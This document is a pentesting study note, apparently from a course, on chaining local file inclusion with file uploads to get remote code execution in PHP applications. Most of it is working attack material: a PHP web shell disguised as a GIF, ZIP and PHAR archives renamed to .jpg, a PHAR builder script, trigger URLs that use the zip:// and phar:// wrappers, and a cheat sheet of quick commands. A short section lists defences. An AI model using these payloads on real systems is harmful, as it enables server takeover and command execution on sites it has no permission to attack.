# File Inclusion – RCE via LFI and File Uploads

## Overview

File upload functionality is everywhere in modern web applications. Users upload avatars, documents, attachments, media, and other content all the time. On its own, a normal file upload feature is not necessarily vulnerable.

The danger appears when a file upload feature is combined with a **file inclusion vulnerability**.

If we can upload a file to the server, and the vulnerable inclusion function has **execute** capability, then including our uploaded file can cause any embedded code inside it to run. This can lead directly to **remote code execution (RCE)**.

This is a powerful chain because:

- the upload feature only needs to allow file storage
- the upload feature itself does **not** need to be vulnerable
- the actual exploitation happens through the **LFI/file inclusion flaw**

---

# Why This Works

If the vulnerable inclusion function executes code, then it may not care that the uploaded file is called `.jpg`, `.gif`, or something else. If the backend parser treats the included file as executable content, then the PHP code inside it may run anyway.

## Functions that can lead to execution

| Language | Function | Read Content | Execute | Remote URL |
|---|---|---:|---:|---:|
| PHP | `include()` / `include_once()` | ✅ | ✅ | ✅ |
| PHP | `require()` / `require_once()` | ✅ | ✅ | ❌ |
| NodeJS | `res.render()` | ✅ | ✅ | ❌ |
| Java | `import` | ✅ | ✅ | ✅ |
| .NET | `include` | ✅ | ✅ | ✅ |

If the vulnerable function only reads content but does not execute it, this technique will not work for code execution.

---

# Attack Flow

The general workflow looks like this:

1. create a file containing executable PHP code
2. disguise it as an allowed upload type
3. upload it through a normal upload form
4. find the path of the uploaded file
5. include that file through the LFI vulnerability
6. trigger command execution

Think of it like hiding a fuse inside an ordinary-looking object, then using the include bug as the spark.

---

# Method 1 – Malicious Image Upload

This is the most reliable and most practical technique.

## Crafting a malicious image

We want a file that:

- looks like an allowed image type
- may pass extension checks
- may pass basic magic byte checks
- still contains PHP code

Example using a GIF:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

### Why this works

- `GIF8` acts like an image header-style prefix
- the file is named with an image extension (`.gif`)
- the PHP web shell is embedded after the image bytes

This file is harmless in a normal upload context, but if the server later **includes** it via LFI, the PHP code may execute.

> GIF is convenient here because its signature is easy to type as ASCII. Other formats may require binary-safe handling.

---

# Upload the malicious file

Example target settings page:

```text
http://<SERVER_IP>:<PORT>/settings.php
```

Upload `shell.gif` as a profile image or avatar.

The file upload itself does not need to be insecure beyond allowing storage of the file.

---

# Find the uploaded file path

After upload, inspect the page source or HTML. Example:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

This gives us the path:

```text
/profile_images/shell.gif
```

If the path is not obvious, options include:

- inspect HTML source
- inspect network traffic
- fuzz common upload directories
- search for predictable file paths

---

# Trigger code execution through LFI

Now include the uploaded file through the vulnerable parameter:

```text
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

If successful, the PHP code inside the image runs and executes:

```bash
id
```

Expected-style output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Important note

In this example, we used:

```text
./profile_images/shell.gif
```

because the vulnerable inclusion point does not prepend extra directories.

If the application prefixes a path, then we may need to use traversal first, for example:

```text
../../../profile_images/shell.gif
```

---

# Method 2 – Zip Wrapper Upload

This is a PHP-specific technique and should be treated as a secondary option.

The idea is to place a PHP file inside a ZIP archive and then include it using the `zip://` wrapper.

## Step 1 – Create the PHP shell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## Step 2 – Zip it and disguise it

```bash
zip shell.jpg shell.php
```

This creates a ZIP archive named `shell.jpg`.

### Why rename it to `.jpg`?

To try to pass simplistic extension filters.

### Limitation

Some upload forms still inspect the actual content type and may detect it as a ZIP archive, so this method is less reliable than the image technique.

---

# Upload the disguised ZIP

Upload `shell.jpg` through the application.

---

# Include the ZIP with the wrapper

Use the `zip://` wrapper and point to the file inside the archive:

```text
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Breakdown

- `zip://` → invoke ZIP wrapper
- `./profile_images/shell.jpg` → uploaded archive path
- `%23shell.php` → `#shell.php`, meaning the inner file
- `&cmd=id` → execute command

If successful, the shell inside the archive executes.

---

# Method 3 – Phar Wrapper Upload

This is another PHP-specific technique and is also more situational.

The `phar://` wrapper lets us reference files inside a PHAR archive.

## Step 1 – Create a PHAR builder script

Save as `shell.php`:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

## Step 2 – Compile and rename it

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now we have a PHAR archive disguised as `shell.jpg`.

---

# Upload the PHAR file

Upload `shell.jpg` to the target.

---

# Include the PHAR with the wrapper

```text
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

### Breakdown

- `phar://` → invoke PHAR wrapper
- `./profile_images/shell.jpg` → uploaded PHAR archive
- `%2Fshell.txt` → inner file path
- `&cmd=id` → execute command

If successful, the PHP shell stored inside the archive executes.

---

# Wrapper Method Comparison

| Method | Reliability | Requirements | Notes |
|---|---|---|---|
| Image upload | High | executable include function | best first choice |
| ZIP wrapper | Medium | PHP ZIP wrapper support | can fail due to content-type checks |
| PHAR wrapper | Medium | PHP PHAR support | more situational and PHP-specific |

The **image upload method** is usually the best option because it is simpler and more reliable.

---

# Why the Image Method Is Usually Best

The image method works well because:

- many apps allow image uploads
- images are often trusted more than archives
- the upload form may only check extension or a simple signature
- no wrapper support is required
- it works across more real-world cases

By contrast, ZIP and PHAR methods depend on wrapper support and may be easier for the app to reject.

---

# Practical Example Workflow

## 1. Create shell image

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

## 2. Upload file

Use the avatar/profile upload page.

## 3. Discover file path

Example from HTML source:

```html
<img src="/profile_images/shell.gif">
```

## 4. Trigger LFI

```text
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=whoami
```

## 5. Confirm execution

Expected style:

```text
www-data
```

---

# Common Pitfalls

## Upload succeeds, but no execution
Possible reasons:

- vulnerable function reads but does not execute
- PHP engine is not processing the included file as executable content
- wrong file path
- wrong parameter name
- command parameter mismatch (`cmd`, `c`, etc.)

## File path unknown
Try:

- HTML source inspection
- browser dev tools
- upload location fuzzing
- predictable file name testing

## Extension checks block the file
Try:

- alternate allowed extensions such as `.gif`
- proper magic bytes
- wrapper methods if archives are allowed

## LFI prefixes another path
Use traversal:

```text
../../../profile_images/shell.gif
```

---

# Notes on Detection and Defenses

This attack chain is dangerous because it combines two features that may each look harmless on their own:

- normal file uploads
- normal template/file inclusion logic

## Defensive measures

- never include files based on unsanitized user input
- store uploads outside the web/application include path
- prevent executable interpretation of uploaded content
- verify real MIME type and content safely
- rename uploads randomly and segregate them
- use allowlists for include targets
- disable unnecessary wrappers where possible

---

# Quick Commands

## Malicious image shell

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

## Basic PHP web shell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## Zip-based payload

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

## Phar-based payload builder

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

## Example trigger – image upload

```text
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

## Example trigger – ZIP wrapper

```text
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## Example trigger – PHAR wrapper

```text
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

---

# Key Takeaways

- file uploads become much more dangerous when paired with LFI
- the upload feature itself does not need to be vulnerable
- the vulnerable include function is what turns storage into execution
- a fake image with embedded PHP is often the most reliable route
- ZIP and PHAR wrappers are useful fallback options in PHP environments
- always identify the uploaded file path before attempting inclusion

---

# Tags

#file-inclusion
#lfi
#rce
#file-uploads
#php
#zip-wrapper
#phar-wrapper
#webshell
#pentesting
#owasp
#obsidian